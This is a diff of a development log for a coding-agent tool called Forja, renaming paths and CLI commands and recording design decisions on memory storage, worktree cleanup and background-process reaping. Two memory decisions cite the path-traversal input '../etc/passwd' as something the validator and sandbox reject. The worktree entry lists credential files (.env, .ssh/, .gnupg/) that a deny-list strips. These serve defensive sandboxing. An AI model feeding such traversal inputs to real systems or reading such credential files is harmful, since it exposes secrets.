 - **D10 — `validateName` in `memory_read` is defense-in-depth.** The registry's `lookup` already rejects unknown names with `null`. But a path-traversal attempt (`../etc/passwd`) would be a "name not found" rather than a "rejected as invalid", which masks the intent. Re-running the validator at the tool boundary surfaces the rejection as `tool.invalid_arg` with the validator's specific error message; the audit log then records the attempt under the right shape.
 - **D11 — `memory.*` error codes, distinct from `tool.*` general codes.** Following the same convention as `bash.timeout`, `glob.pattern_escapes_root`. The discriminated codes let policy / metric layers route memory-specific failures (e.g. "alert when a session sees N consecutive `memory.body_missing`s — operator broke their index").
-- **D12 — `metadata.category: 'misc'` for all three tools.** Same rationale as `todo_write` (todo-write.ts:107): the tools have no fs/network/bash side effects routed through the policy engine. Reads go through the registry's in-memory snapshot + audit table; the policy engine has no per-memory permission concept yet. A future "deny memory read by scope" rule would want a dedicated `memory.read` category, not `fs.read` (memory paths are inside `~/.config/agent/memory/`, not the cwd's fs surface). Defer until policy demand exists.
+- **D12 — `metadata.category: 'misc'` for all three tools.** Same rationale as `todo_write` (todo-write.ts:107): the tools have no fs/network/bash side effects routed through the policy engine. Reads go through the registry's in-memory snapshot + audit table; the policy engine has no per-memory permission concept yet. A future "deny memory read by scope" rule would want a dedicated `memory.read` category, not `fs.read` (memory paths are inside `~/.config/forja/memory/`, not the cwd's fs surface). Defer until policy demand exists.
 
 **Pending / known limitations:**
 
 - **No system prompt injection yet.** Spec §4.1 mandates the memory index be eager in the system prompt with a cache breakpoint after AGENTS.md. This sub-slice (a) does NOT wire that — the model has to invoke `memory_list` explicitly to discover available memories. Practical impact: lower memory-utilization ergonomics until 5.2.c lands. Functional impact: zero — the tools work correctly, the model just doesn't know to call them without prompting. AGENTS.md isn't implemented in this codebase yet either, so there's no anchor for the cache breakpoint anyway; both probably land together.
-- **No CLI surface yet.** `agent --memory list` and `agent --memory show <name>` are 5.2.b. Operators inspect memories today either via the tools (in a session) or via raw `cat ./.agent/memory/local/MEMORY.md`.
+- **No CLI surface yet.** `forja --memory list` and `forja --memory show <name>` are 5.2.b. Operators inspect memories today either via the tools (in a session) or via raw `cat ./.forja/memory/local/MEMORY.md`.
 - **Body reads don't cache.** Same memory read 100 times in a session = 100 disk reads + 100 audit rows. Acceptable: bodies are short, audit rows are the contract (every read leaves a trace), and a cache would either need fs-watcher complexity or a per-session window that confuses model-user mental model. If it becomes a hot path the registry can grow a per-session memo with explicit invalidation; defer until measurable.
 - **Search is substring-only, single pass, no ranking.** Spec is explicit: grep, not vector. The hit order is precedence order (local first), then encounter order within scope. No relevance scoring. If two entries match the query, the one in `project_local` always comes first regardless of how strong the match is. Operators wanting BM25-ish ranking would need to reach for ripgrep; defer.
 - **Scope precedence is hard-coded.** No way for an operator to invert (e.g. "user beats local in this run"). Doesn't match any spec or use case yet; mention so the future hook surface knows the constraint.
@@ -33445,7 +34749,7 @@ and c (system prompt index injection) follow.
 
 **Verification:** `bun test` 1575 pass / 10 skip / 0 fail (+62 new across loader, registry, three tool tests, plus the bootstrap snapshot bump and 2 review-driven regression tests for C1/M1); `tsc --noEmit` clean; `biome check` clean. No smoke eval — the tools have no end-to-end LLM coupling yet (`memory_search` and friends only matter once the model can see them via system prompt index, deferred to 5.2.c). The unit + integration coverage exercises every audit path and every error branch.
 
-**Next:** M3 / Step 5.2.b — `agent --memory <verb>` CLI handlers (`list [scope]`, `show <name>`). Independent of bootstrap (no provider needed, mirrors `--checkpoints` / `--worktrees` shape). Then 5.2.c — system prompt assembler that injects the merged memory index header. AGENTS.md integration may bundle into 5.2.c or land separately depending on scope.
+**Next:** M3 / Step 5.2.b — `forja --memory <verb>` CLI handlers (`list [scope]`, `show <name>`). Independent of bootstrap (no provider needed, mirrors `--checkpoints` / `--worktrees` shape). Then 5.2.c — system prompt assembler that injects the merged memory index header. AGENTS.md integration may bundle into 5.2.c or land separately depending on scope.
 
 ---
 
@@ -33464,7 +34768,7 @@ the memory subsystem (5.2 read tools, 5.3 write surface, 5.4
 trust integration, 5.5 promote/demote, 5.6 lifecycle) builds
 on. Scope intentionally narrow: types, file format,
 filesystem layout, audit table, and the auto-generated
-`.agent/.gitignore`. No tools, no CLI, no LLM coupling.
+`.forja/.gitignore`. No tools, no CLI, no LLM coupling.
 
 **Done:**
 
@@ -33473,8 +34777,8 @@ filesystem layout, audit table, and the auto-generated
 | `src/memory/types.ts` | NEW — vocabulary: `MemoryType` (user/feedback/project/reference), `MemorySource` (user_explicit/inferred/imported), `MemoryTrust` (trusted/untrusted), `MemoryScope` (user/project_shared/project_local), `MemoryFrontmatter`, `MemoryFile`, `IndexEntry`. Strict shapes; optional fields preserved as absent (not coerced) on round-trip per `exactOptionalPropertyTypes`. |
 | `src/memory/frontmatter.ts` | NEW — parser/writer for the YAML frontmatter block (re-uses existing `yaml` dep already in package.json for permissions config). Strict validation: name kebab-case `[a-z0-9][a-z0-9_-]*` ≤120 chars, description single-line ≤200 chars, type/source/trust enum-checked, expires `YYYY-MM-DD` shape, triggers kebab-case ≤64 chars. Unknown fields rejected (forward compat: future spec rev with `tags`/`priority` shouldn't silently round-trip-drop). Canonical writer emits fields in spec order regardless of insertion order; serialize re-validates so callers can't smuggle invalid state. CRLF normalized on parse. |
 | `src/memory/index-file.ts` | NEW — `MEMORY.md` per-scope index parser/writer. Entry shape `- [<title>](<href>) — <hook>`; em-dash canonical, ASCII ` - ` accepted as fallback for hand-edited files. `parseIndex` returns entries + `malformedLines` (1-based line numbers) for forensic surfaces; comments/headings (`#`/`>`) and blank lines silently skipped. `serializeIndex` reports `oversizedEntries` (>150 chars per spec §3.2 soft cap) and throws `IndexError` if total lines exceed the 200 hard cap (the storage primitive doesn't pick eviction policy — that lives in 5.2). `upsertIndexEntry`/`removeIndexEntry` are immutable. |
-| `src/memory/paths.ts` | NEW — scope path resolver + write sandbox. `userScopeRoot` honors `XDG_CONFIG_HOME` (per spec convention; falls back to `~/.config`). `projectScopeRoots(repoRoot)` produces `<repoRoot>/.agent/memory/{shared,local}`. `memoryFilePath` validates name then re-resolves the joined path and verifies it sits strictly under the scope root (defense-in-depth even after `validateName` already rejects `..`/separators/leading dots). `scopeOfPath` does the inverse for UI/audit; checks local first so the sub-path doesn't accidentally match shared. Strict prefix check uses `root + sep` so `/cache` doesn't accept `/cache2/`. |
-| `src/memory/gitignore.ts` | NEW — `ensureAgentGitignore(repoRoot)` writes default `.agent/.gitignore` per spec §2.5 on first invocation, never overwrites. Uses `wx` flag so a concurrent agent racing on first init is a no-op rather than a clobber. Defaults: `sessions.db`, `sessions.db-*`, `traces/`, `checkpoints/`, `memory/local/`, `*.log`. |
+| `src/memory/paths.ts` | NEW — scope path resolver + write sandbox. `userScopeRoot` honors `XDG_CONFIG_HOME` (per spec convention; falls back to `~/.config`). `projectScopeRoots(repoRoot)` produces `<repoRoot>/.forja/memory/{shared,local}`. `memoryFilePath` validates name then re-resolves the joined path and verifies it sits strictly under the scope root (defense-in-depth even after `validateName` already rejects `..`/separators/leading dots). `scopeOfPath` does the inverse for UI/audit; checks local first so the sub-path doesn't accidentally match shared. Strict prefix check uses `root + sep` so `/cache` doesn't accept `/cache2/`. |
+| `src/memory/gitignore.ts` | NEW — `ensureAgentGitignore(repoRoot)` writes default `.forja/.gitignore` per spec §2.5 on first invocation, never overwrites. Uses `wx` flag so a concurrent agent racing on first init is a no-op rather than a clobber. Defaults: `sessions.db`, `sessions.db-*`, `traces/`, `checkpoints/`, `memory/local/`, `*.log`. |
 | `src/memory/index.ts` | NEW — barrel re-export. |
 | `src/storage/migrations/016-memory-events.ts` | NEW — `memory_events` table per spec §5.3. Columns: id (UUID PK), scope (CHECK), action (CHECK over 9 verbs incl. expired pre-reserved for 5.6), memory_name, source (CHECK), session_id (FK ON DELETE SET NULL — audit survives session purge), cwd, created_at, details (JSON TEXT). Two indexes: partial on `(session_id) WHERE NOT NULL` for the per-session audit feed, composite `(memory_name, created_at DESC)` for the per-memory history view. |
 | `src/storage/migrations/index.ts` | +import + array entry for migration 016. |
@@ -33488,7 +34792,7 @@ filesystem layout, audit table, and the auto-generated
 
 **Decisions (post-review polish bundled in):**
 
-- **D12 (post-review C1) — `memoryFilePath` resolves BOTH root and candidate before sandbox check.** Pre-review the function only `resolve()`'d the candidate; if a caller passed a non-canonical `repoRoot` (e.g. `/repo/.agent/..`), the unnormalized root prefix wouldn't match the normalized candidate and the sandbox would falsely reject a semantically-correct path. Fix: `resolve(rootForScope(...))` before the prefix comparison. Same fix applied to `scopeOfPath` for symmetry — non-canonical `roots` (trailing slashes, `..` segments) now classify correctly. Defense-in-depth even though `repoRoot` upstream comes from `git rev-parse --show-toplevel` (canonical); the storage layer doesn't get to assume.
+- **D12 (post-review C1) — `memoryFilePath` resolves BOTH root and candidate before sandbox check.** Pre-review the function only `resolve()`'d the candidate; if a caller passed a non-canonical `repoRoot` (e.g. `/repo/.forja/..`), the unnormalized root prefix wouldn't match the normalized candidate and the sandbox would falsely reject a semantically-correct path. Fix: `resolve(rootForScope(...))` before the prefix comparison. Same fix applied to `scopeOfPath` for symmetry — non-canonical `roots` (trailing slashes, `..` segments) now classify correctly. Defense-in-depth even though `repoRoot` upstream comes from `git rev-parse --show-toplevel` (canonical); the storage layer doesn't get to assume.
 - **D13 (post-review C2) — Comment in `isUnderRoot` was inverted on symlink semantics.** Pre-review: "we don't re-resolve here because that would silently follow symlinks and defeat the sandbox." Wrong: `resolve()` is path-shape normalization (collapses `..`/`.` segments), it does NOT follow symlinks; that's `realpathSync`. Reading the wrong comment would lead future iterations to skip normalization for the wrong reason and re-introduce C1. Rewrote to clarify: `resolve()` normalizes shape, symlink defense is the writer's job (5.3) per the existing worktree-validator pattern.
 - **D14 (post-review M1) — Misleading comment in `listMemoryEventsBySession` rewritten.** Pre-review said purged-session rows "drop out via the SET NULL FK", which conflates "row is excluded by the WHERE clause" with "row is deleted". Clarified: rows survive (FK SET NULL preserves audit history); the per-session filter excludes them, but they remain reachable via `listMemoryEventsByName`.
 - **D15 (post-review M2) — Index-file parser security contract documented.** The `ENTRY_RE` regex accepts any non-paren content as `href`, so a malicious or hand-mangled MEMORY.md could embed `../../../etc/passwd`. Risk is currently zero because the storage layer doesn't compute paths from hrefs (5.2 lazy-loader uses `memoryFilePath(scope, name)` from a name-keyed map), but the contract was implicit and a future caller could regress. Added a SECURITY CONTRACT block to the file header making the rule explicit: callers MUST resolve paths via `memoryFilePath`, never by joining `entry.href`. The writer (5.4+) emits canonical `href = "${name}.md"` so agent-driven rewrites converge toward safe state.
@@ -33500,9 +34804,9 @@ filesystem layout, audit table, and the auto-generated
 - **D5 — Sandbox is two-layered.** `validateName` blocks 99% of attacks (no separators, no `..`, no leading dot, kebab-case only). The post-resolve `isUnderRoot` check is defense-in-depth: if a future change ever loosens `validateName`, the sandbox still catches the escape. Same posture as the worktree gc cache-root scoping (§4.2d D7).
 - **D6 — `expired` action verb pre-reserved.** Adding it to the CHECK clause in migration 016 costs nothing and avoids a follow-up migration when 5.6 lands the lifecycle pass. The repo helpers in 5.1 don't emit it yet — it's just reserved vocabulary. Same pattern as the two-pass M3 staging that pre-allocated `policy_snapshot` before 4.2b.ii actually used it.
 - **D7 — `session_id` is FK ON DELETE SET NULL, not CASCADE.** Audit history outlives the session that produced it. After session purge ("rotate out sessions older than 90d"), the audit row stays so operators can still answer "this memory was created via inferred write at this time" — they just lose the link to the originating session. CASCADE would silently delete audit history on a routine cleanup, which defeats the audit's purpose. Same rationale as `subagent_runs` keeping rows after parent session deletion.
-- **D8 — No content column in `memory_events.details`.** The temptation: stash the body alongside the event so `/memory audit` can show "what changed". Resisted: bodies live in markdown files, git tracks shared changes, and inferred writes ship a content hash in `details` (5.3) for forensic traceability without duplicating bytes. If the operator wants to see what the body was, they `git show <commit>:.agent/memory/shared/<name>.md`.
+- **D8 — No content column in `memory_events.details`.** The temptation: stash the body alongside the event so `/memory audit` can show "what changed". Resisted: bodies live in markdown files, git tracks shared changes, and inferred writes ship a content hash in `details` (5.3) for forensic traceability without duplicating bytes. If the operator wants to see what the body was, they `git show <commit>:.forja/memory/shared/<name>.md`.
 - **D9 — `MEMORY.md` is canonical state owned by the agent, NOT preserve-prose-on-write.** The parser silently drops non-entry lines (other than `#`/`>` headings and blanks); the writer regenerates clean. Operator prose belongs in individual memory bodies, where it's properly framed by frontmatter. An "ambient comment" in the index would have nowhere durable to live.
-- **D10 — `userScopeRoot` honors XDG_CONFIG_HOME but ignores XDG_DATA_HOME.** Memory is curated config, not generated data. The spec path `~/.config/agent/memory/` aligns with config; routing it through `defaultDataDir()` (which uses XDG_DATA_HOME and `~/.local/share`) would put memory under the same root as `sessions.db` — convenient for one-tarball backups but semantically wrong, and the spec is explicit about the path. We also ignore relative XDG values (specs say MUST be absolute) rather than silently normalizing.
+- **D10 — `userScopeRoot` honors XDG_CONFIG_HOME but ignores XDG_DATA_HOME.** Memory is curated config, not generated data. The spec path `~/.config/forja/memory/` aligns with config; routing it through `defaultDataDir()` (which uses XDG_DATA_HOME and `~/.local/share`) would put memory under the same root as `sessions.db` — convenient for one-tarball backups but semantically wrong, and the spec is explicit about the path. We also ignore relative XDG values (specs say MUST be absolute) rather than silently normalizing.
 - **D11 — Em-dash is canonical separator; ASCII fallback accepted on read only.** Spec uses `—` consistently. We emit it on write; we accept ` - ` (space-hyphen-space) on read because operators editing by hand on a US keyboard rarely have `—` at fingertips, and the alternative (fail-on-parse) creates user friction in a primary edit path. Round-tripping converts `-` to `—`, which is harmless — the index is regenerated from canonical state on every write anyway.
 
 **Pending / known limitations:**
@@ -33520,13 +34824,13 @@ filesystem layout, audit table, and the auto-generated
 
 ---
 
-## [2026-04-30] M3 / Step 4.2d — `agent --worktrees` operator surface (gc + list)
+## [2026-04-30] M3 / Step 4.2d — `forja --worktrees` operator surface (gc + list)
 
 The 4.2b arc landed full subagent worktree lifecycle (create, isolate,
 validate, cleanup, bg). Spec §11.2 + §16.9 describe the operator
-surface — "Pai decide: merge, descarta, ou abre PR" + "agent worktree
+surface — "Pai decide: merge, descarta, ou abre PR" + "forja worktree
 gc manual" — but no command existed yet. This slice fills that gap
-with `agent --worktrees list` and `agent --worktrees gc [--dry-run]
+with `forja --worktrees list` and `forja --worktrees gc [--dry-run]
 [--force]`, anchored on a small reconciler that joins the audit table,
 the cache filesystem, and `git worktree list --porcelain` output.
 
@@ -33552,13 +34856,13 @@ the cache filesystem, and `git worktree list --porcelain` output.
 - **D10 (post-review M3) — Don't silence git-known orphans with null branch.** Earlier draft skipped emission when `!onDisk && gitBranch === null` under the dbRow=undefined branch. Hid genuine inconsistencies (git admin entry without a `branch` line, working tree externally removed). Removed the skip; emits orphan with `branch: null` so the operator gets the signal.
 - **D11 (post-review M4) — Deleted unused `formatTime` helper.** YAGNI; re-add when an actual filter needs it.
 
-- **D1 — Flag style (`--worktrees`), not subcommand-style (`agent worktree gc`).** Spec §1605 wrote `agent worktree gc`, but Forja's existing surface uses flags exclusively (`--checkpoints`, `--undo`, `--list-sessions`, `--resume`). Consistency wins: same parser shape, same dispatch path in run.ts, same test patterns. The user types `agent --worktrees gc --dry-run` instead of `agent worktree gc --dry-run`; trade-off is two extra characters for code that's smaller and more uniform.
+- **D1 — Flag style (`--worktrees`), not subcommand-style (`forja worktree gc`).** Spec §1605 wrote `forja worktree gc`, but Forja's existing surface uses flags exclusively (`--checkpoints`, `--undo`, `--list-sessions`, `--resume`). Consistency wins: same parser shape, same dispatch path in run.ts, same test patterns. The user types `forja --worktrees gc --dry-run` instead of `forja worktree gc --dry-run`; trade-off is two extra characters for code that's smaller and more uniform.
 - **D2 — Plan/apply split.** `buildGcPlan` returns a `WorktreeGcPlan` value; `applyGcPlan` consumes it. Splits policy from side effects. `--dry-run` literally just renders the plan and skips apply. Tests can assert classification logic (engine pure with stubs) AND apply outcomes (engine + recorded mock removals) independently.
 - **D3 — Seven entry kinds, not three.** Initial sketch had `orphan`, `ready_to_remove`, `preserved_dirty`. Adding `stale_cleaned`, `missing`, and `active` covered the realistic-but-uncommon states without making the apply branch a dictionary of edge cases. `active` in particular is load-bearing: 4.2b inserts active rows BEFORE child spawn, and gc must NEVER touch a worktree whose subagent is still running.
 - **D4 — `--force` only lifts `preserved_dirty` + `orphan`.** Other kinds either auto-act (`ready_to_remove`, `stale_cleaned`, `missing`) or never act (`active`). The flag's surface area stays small and operator-predictable.
 - **D5 — Removal failure leaves audit untouched.** A `git worktree remove` that fails leaves the row at its existing status (`preserved` or `cleaned`). Operator can retry via the next `gc` pass. The alternative (flipping audit on failure) would lie about the world state, which is the bug we already fixed in the bg reaper. Same principle.
 - **D6 — Branch deletion is best-effort and only on successful removal.** A failed remove leaves the working tree linked to the branch and `git branch -D` would refuse. Branch survival is fine — operator can `git branch -D` themselves once the worktree is gone.
-- **D7 — `agent --worktrees merge <id>` deferred.** The spec mentions merge, but operators can use raw `git merge agent/<slug>-<id>` today without ergonomics loss. A merge wrapper would need to handle conflict surfaces (interactive prompts in --json mode? abort flow?) that don't have clear answers yet. Defer until the dor de uso aparece.
+- **D7 — `forja --worktrees merge <id>` deferred.** The spec mentions merge, but operators can use raw `git merge agent/<slug>-<id>` today without ergonomics loss. A merge wrapper would need to handle conflict surfaces (interactive prompts in --json mode? abort flow?) that don't have clear answers yet. Defer until the dor de uso aparece.
 
 **Pending / known limitations:**
 
@@ -33595,19 +34899,19 @@ manager without colliding with the parent's bg state.
 
 | File | Change |
 |---|---|
-| `src/subagents/runtime.ts` | `SpawnChildProcessOptions` gains a `bgLogDir?: string` field; `defaultSpawnChildProcess` forwards it via `--subagent-bg-log-dir <path>`. `runSubagent` computes `<input.cwd>/.agent/bg/<childSessionId>/` (anchored to the parent's cwd, not the worktree, so the operator's `bg list` from the project root keeps showing only parent processes) and passes it on every spawn. End-of-run cleanup adds a best-effort `rmSync` of the directory after `cleanupWorktree` — the bg manager creates the dir lazily on first spawn, so subagents that never invoked a bg tool leave nothing to remove. The previous `requiresBgManager` refusal in `assertWhitelistValidForSubagent` is removed; the comment is reworded to reference the lift. |
+| `src/subagents/runtime.ts` | `SpawnChildProcessOptions` gains a `bgLogDir?: string` field; `defaultSpawnChildProcess` forwards it via `--subagent-bg-log-dir <path>`. `runSubagent` computes `<input.cwd>/.forja/bg/<childSessionId>/` (anchored to the parent's cwd, not the worktree, so the operator's `bg list` from the project root keeps showing only parent processes) and passes it on every spawn. End-of-run cleanup adds a best-effort `rmSync` of the directory after `cleanupWorktree` — the bg manager creates the dir lazily on first spawn, so subagents that never invoked a bg tool leave nothing to remove. The previous `requiresBgManager` refusal in `assertWhitelistValidForSubagent` is removed; the comment is reworded to reference the lift. |
 | `src/subagents/validate.ts` | Bootstrap-time `requiresBgManager` refusal removed; header comment shrinks from "three checks" to "two checks" plus a note about why the third was lifted. |
 | `src/cli/subagent-child.ts` | `SubagentChildOptions` gains `bgLogDir?: string`; the `HarnessConfig` build conditionally spreads it in. When omitted (older parents, tests routing around the spawn) the harness runs without a bg manager and `requiresBgManager` tools refuse at invocation time — same shape as a top-level run without `bgLogDir`. |
 | `src/cli/args.ts` | `--subagent-bg-log-dir <path>` recognized in the parser; `ParsedArgs.subagentBgLogDir?: string` added. Empty / missing value rejected with a parse error mirroring the other subagent-internal flags. |
 | `src/cli/index.ts` | The parsed `subagentBgLogDir` flows into `runSubagentChild` through the same conditional-spread pattern as the other subagent flags. |
 | `tests/subagents/validate.test.ts` | Three pre-existing tests that asserted refusal flipped to assert acceptance under the new contract: `bash_background` under `isolation: 'worktree'` accepted; `bash_output` (writes:false + requiresBgManager:true) accepted under both isolation modes. The "accept under worktree, reject under none via writes gate" path stayed (writes:true refusal still fires under `isolation: 'none'` — bg lift didn't relax that), with the message regex updated to match the writes-gate error. The pure `requiresBgManager error names the offending source path` test was deleted (the message no longer exists). |
-| `tests/subagents/runtime.test.ts` | The `requiresBgManager tool refused regardless of isolation` test inverted to `4.2b.iv: requiresBgManager tool no longer rejected by registry gate` — asserts that the runtime gets PAST the registry validation (the worktree creation still fails because the test cwd '/p' isn't a git repo, but the failure reason is `worktree_create_failed`, not the registry refusal). +2 new tests: `parent threads per-session bgLogDir into spawn opts` (path shape `<parentCwd>/.agent/bg/<sessionId>/`), and `cleanupWorktree end-of-run removes the bgLogDir if it exists` (spawn fake mkdirs the dir and writes a fake log file; runtime's end-of-run rmSync must remove it). |
+| `tests/subagents/runtime.test.ts` | The `requiresBgManager tool refused regardless of isolation` test inverted to `4.2b.iv: requiresBgManager tool no longer rejected by registry gate` — asserts that the runtime gets PAST the registry validation (the worktree creation still fails because the test cwd '/p' isn't a git repo, but the failure reason is `worktree_create_failed`, not the registry refusal). +2 new tests: `parent threads per-session bgLogDir into spawn opts` (path shape `<parentCwd>/.forja/bg/<sessionId>/`), and `cleanupWorktree end-of-run removes the bgLogDir if it exists` (spawn fake mkdirs the dir and writes a fake log file; runtime's end-of-run rmSync must remove it). |
 
 **Decisions:**
 
-- **bgLogDir anchored to parent's cwd, namespaced under `subagents/`.** Path: `<parentCwd>/.agent/bg/subagents/<childSessionId>/`. Anchoring to the parent (not the worktree) keeps the operator's `bg list` view consistent (project root shows parent's processes); the `subagents/` infix segregates the namespace so parent flat-file layout (`<bgId>.stdout.log`) and subagent dir layout don't mix in the same directory listing. The alternative (`<worktree>/.agent/bg/`) would auto-clean with worktree removal but risks polluting `git status` if the project doesn't have `.agent/.gitignore`.
+- **bgLogDir anchored to parent's cwd, namespaced under `subagents/`.** Path: `<parentCwd>/.forja/bg/subagents/<childSessionId>/`. Anchoring to the parent (not the worktree) keeps the operator's `bg list` view consistent (project root shows parent's processes); the `subagents/` infix segregates the namespace so parent flat-file layout (`<bgId>.stdout.log`) and subagent dir layout don't mix in the same directory listing. The alternative (`<worktree>/.forja/bg/`) would auto-clean with worktree removal but risks polluting `git status` if the project doesn't have `.forja/.gitignore`.
 - **Lazy directory creation.** The bg manager already creates the directory on first spawn (existing `ensureDir(logDir)` in `bg/manager.ts`). The runtime doesn't pre-create it; subagents that never invoke a bg tool leave no directory to clean up. End-of-run `rmSync` uses `force: true` to swallow ENOENT in the no-spawn case.
-- **Cleanup is best-effort.** The directory holds stdout/stderr log files we no longer need after the run finishes; failing to remove them is operationally harmless (cache pollution, not correctness loss). ENOENT is silenced (common case); other errors (permission denied, disk full) get logged to stderr so the operator notices the cache leak. `agent worktree gc` (4.2d) will sweep stragglers together with stale worktrees.
+- **Cleanup is best-effort.** The directory holds stdout/stderr log files we no longer need after the run finishes; failing to remove them is operationally harmless (cache pollution, not correctness loss). ENOENT is silenced (common case); other errors (permission denied, disk full) get logged to stderr so the operator notices the cache leak. `forja worktree gc` (4.2d) will sweep stragglers together with stale worktrees.
 - **Reap orphan bg processes before rmSync (D10 from review).** Pre-review the cleanup pattern relied on the child harness's `bgManager.cleanup()` running in its own finally to kill live processes. That assumption holds for clean exits but FAILS for the SIGKILL paths 4.2b.ii.b made common (heartbeat stale, wall-clock kill, abort escalation) — finally is uncatchable past SIGKILL, processes get reparented to PID 1 and the rmSync would unlink log files they're still writing to. `reapChildBgProcesses` now runs before rmSync: queries `listBgProcessesBySession(status='running')`, SIGTERMs each PID, waits 500ms, SIGKILLs survivors, marks DB rows as 'killed'. Idempotent — no-op when the child's finally already cleaned up.
 - **Reap before worktree cleanup (D16 from review #10).** The previous order ran `cleanupWorktree` before `reapChildBgProcesses`, so live bg processes the child spawned with `bash_background` (whose default cwd is the worktree) could race with `git status --porcelain` (partial-write artifacts triggering preserve when post-reap state would be clean) AND block `git worktree remove --force` on filesystems that refuse to drop a directory while another process has it as cwd (Windows / older macOS / NFS mounts; cleanupWorktree's own comment already calls this out). The reorder guarantees a stable post-reap snapshot before the worktree pass: bg processes dead, cwd-pins released, tracked diff frozen.
 - **Tri-state PID identity: `match`/`gone`/`mismatch` (D15 from review #9).** The boolean `isStillSameProcess` collapsed two distinct outcomes — process truly gone (ENOENT on /proc, audit row should flip terminal) and identity mismatch (recycled PID, exec-replace, EACCES — process MAY be alive, audit must stay 'running'). The bulk `markRunningAsKilled(sessionId)` then unconditionally flipped EVERY row in the session to 'killed', meaning a mismatch (e.g. a recorded `exec sleep 60` that bash-replaces itself into sleep) would lie in audit AND let downstream rmSync unlink log files of a still-living process. New design: `checkPidIdentity` returns `'match' | 'gone' | 'mismatch'`. Reaper partitions rows into matched (signal + mark killed), gone (mark killed only), mismatch (skip both). Per-row `markBgProcessAsKilled(db, id)` repo helper replaces the bulk call so we can flip rows individually and leave mismatched rows 'running' for the operator. The conditional rmSync from D14 then naturally preserves the bgLogDir when mismatched rows remain.
@@ -33619,13 +34923,13 @@ manager without colliding with the parent's bg state.
 
 **Pending / known limitations:**
 
-- **No `agent worktree gc` integration yet.** A subagent run that crashed mid-execution before the end-of-run rmSync ran would leave its bg log dir behind. Not a security issue (the dir is the parent's responsibility, not the child's), and the disk cost is bounded by the number of concurrent subagent crashes; 4.2d's gc command will sweep these alongside stale worktrees.
+- **No `forja worktree gc` integration yet.** A subagent run that crashed mid-execution before the end-of-run rmSync ran would leave its bg log dir behind. Not a security issue (the dir is the parent's responsibility, not the child's), and the disk cost is bounded by the number of concurrent subagent crashes; 4.2d's gc command will sweep these alongside stale worktrees.
 - **Per-process resource isolation.** A subagent that spawns 10 long-lived bg processes still consumes the parent's process table and disk space for log files. Future limits (max-bg-per-subagent, max-log-size) would land in the subagent budget structure (`max_steps`, `max_cost_usd`, plus a future `max_bg_processes`). Out of scope for this slice — current usage profile shows even active subagents rarely exceed 1-2 bg processes at a time.
 - **Concurrent subagents on the same parent session.** Each subagent gets a unique `<sessionId>` subdirectory, so directory collisions are impossible. The bg manager's per-process IDs are also session-scoped (not global), so two subagents running concurrently can't see each other's processes through `bash_output` even if they had the same bg ID. ✓ Verified by construction.
 
 **Verification:** `bun test` 1377 pass / 10 skip / 0 fail (+5 new positive tests including SIGKILL-orphan-reap, PID-recycle skip, and basename match coverage; 4 inverted tests); `tsc --noEmit` clean; `biome check` clean.
 
-**Next:** With 4.2b.iv landed, the 4.2b arc is complete. M3 / Step 4.2c — checkpoints inside worktrees (per-step git snapshots on the agent branch so `/undo` works inside subagent runs). Then 4.2d — `agent worktree gc` + merge helpers (operator commands for stale worktree sweep and branch merge-back ergonomics).
+**Next:** With 4.2b.iv landed, the 4.2b arc is complete. M3 / Step 4.2c — checkpoints inside worktrees (per-step git snapshots on the agent branch so `/undo` works inside subagent runs). Then 4.2d — `forja worktree gc` + merge helpers (operator commands for stale worktree sweep and branch merge-back ergonomics).
 
 ---
 
@@ -33741,20 +35045,20 @@ every run, defeating the slice's auto-cleanup contract.
 
 | File | Change |
 |---|---|
-| `src/subagents/worktree.ts` | `createWorktree` now captures the `ValidationResult` from `validateWorktreeContents` and threads it into a new `markValidatorDeletionsSkipWorktree` helper. The helper enumerates tracked files under each removed path via `git ls-files -z` (single files return themselves; sensitive directories like `.ssh/` expand to every tracked descendant), then batch-marks them with `git update-index --skip-worktree -z --stdin`. Skip-worktree failures are non-fatal — the worst case is a preservation `agent worktree gc` (4.2d) reconciles. |
+| `src/subagents/worktree.ts` | `createWorktree` now captures the `ValidationResult` from `validateWorktreeContents` and threads it into a new `markValidatorDeletionsSkipWorktree` helper. The helper enumerates tracked files under each removed path via `git ls-files -z` (single files return themselves; sensitive directories like `.ssh/` expand to every tracked descendant), then batch-marks them with `git update-index --skip-worktree -z --stdin`. Skip-worktree failures are non-fatal — the worst case is a preservation `forja worktree gc` (4.2d) reconciles. |
 | `tests/subagents/worktree.test.ts` | +2 regression tests: (a) full create + cleanup cycle on a repo committing `.env` + `cert.pem` + `.ssh/` asserts `git status --porcelain` empty in the worktree, cleanup classifies `removed=true`, no orphan branch left; (b) child writes through the worktree still trip the dirty check (skip-worktree mask is surgical, doesn't suppress genuine work). |
 
 **Decisions:**
 
 - **Why `--skip-worktree`** (and not `git rm` / status-output filter / chmod / leave-tracked-untouched):
   - `git rm` + commit on the agent branch mutates history; a later merge of the agent branch back into main would propagate the deletion of `.env`. Wrong.
-  - Filtering `git status --porcelain` lines in `cleanupWorktree` against a known-removed list works but pushes validator semantics into cleanup; any future consumer that runs `git status` without going through cleanupWorktree (helpers, debug tooling, the `agent worktree gc` sweep) sees the dirty state and re-introduces the bug.
+  - Filtering `git status --porcelain` lines in `cleanupWorktree` against a known-removed list works but pushes validator semantics into cleanup; any future consumer that runs `git status` without going through cleanupWorktree (helpers, debug tooling, the `forja worktree gc` sweep) sees the dirty state and re-introduces the bug.
   - `chmod 0000` doesn't physically remove the bytes (they sit on disk for the run's duration) and may or may not show as modified depending on `core.fileMode`.
   - Leaving tracked deny-listed files in place defeats the deny-list's purpose (child can read them through the OS regardless of tool-level checks that are still M2 work).
   - `--skip-worktree` is per-worktree (no history mutation), surgical (only the validator's removed paths), and dies with `git worktree remove` (no cleanup needed).
 - **Helper enumerates via `git ls-files -z` per removed path.** Handles single files (returns the path) and directory removals (`.ssh/` returns every tracked file inside) uniformly. Untracked deny-listed deletions (e.g. user's `.env.local` not committed) return empty from `ls-files` and skip the update-index call — no-op when the deletion never showed in status anyway.
 - **Batch via `--stdin -z`.** A `.gnupg/` with hundreds of keyfiles would risk argv overflow if we passed paths inline. `--stdin` + `-z` accepts NUL-separated paths from stdin and matches the format `ls-files -z` already produces, so we just join and write.
-- **skip-worktree failures non-fatal.** The validator already accepted the worktree as secure; failing the run because git refused to flip an index bit would be over-strict. The worst case (preserved-but-cleanable worktree at end of run) is exactly what the operator's `agent worktree gc` (4.2d) is for.
+- **skip-worktree failures non-fatal.** The validator already accepted the worktree as secure; failing the run because git refused to flip an index bit would be over-strict. The worst case (preserved-but-cleanable worktree at end of run) is exactly what the operator's `forja worktree gc` (4.2d) is for.
 
